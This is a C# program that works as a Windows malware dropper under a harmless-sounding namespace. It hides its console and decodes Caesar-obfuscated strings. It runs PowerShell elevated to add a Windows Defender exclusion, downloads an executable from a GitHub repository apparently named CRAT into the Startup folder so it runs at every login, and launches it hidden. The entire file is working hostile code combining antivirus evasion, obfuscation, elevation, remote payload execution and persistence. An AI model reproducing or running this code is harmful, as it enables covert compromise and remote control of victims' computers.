using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace MakeDirAndDownloadFile
{
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            try
            {
                Cp cp = new Cp();
                string nm = cp.decrypt("srzhuvkhoo.hah");
                string com = cp.decrypt("Dgg-PsSuhihuhqfh -HafoxvlrqSdwk 'F:\\PbIroghu'");

                ExecuteProcess(nm, com);

                string link = "https://github.com/arkadiychulkover/CRAT/raw/refs/heads/master/CRAT/ForEgor.exe";
                string fileName = "ForEgor.exe";
                string autostartPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string filePath = Path.Combine(autostartPath, fileName);

                if (!File.Exists(filePath))
                {
                    DownloadFile(link, filePath);
                }

                ExecuteProcess(filePath, "");
            }
            catch (Exception ex)
            {
                ShowWindow(handle, SW_SHOW);
                Console.WriteLine($"Error: {ex.Message}");
                Console.ReadKey();
            }
            finally
            {
                Environment.Exit(0);
            }
        }

        static void ExecuteProcess(string fileName, string arguments)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                Verb = "runas",
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using (Process process = new Process { StartInfo = startInfo })
            {
                process.Start();
                process.WaitForExit();
            }
        }

        static void DownloadFile(string url, string savePath)
        {
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, savePath);
            }
        }
    }
}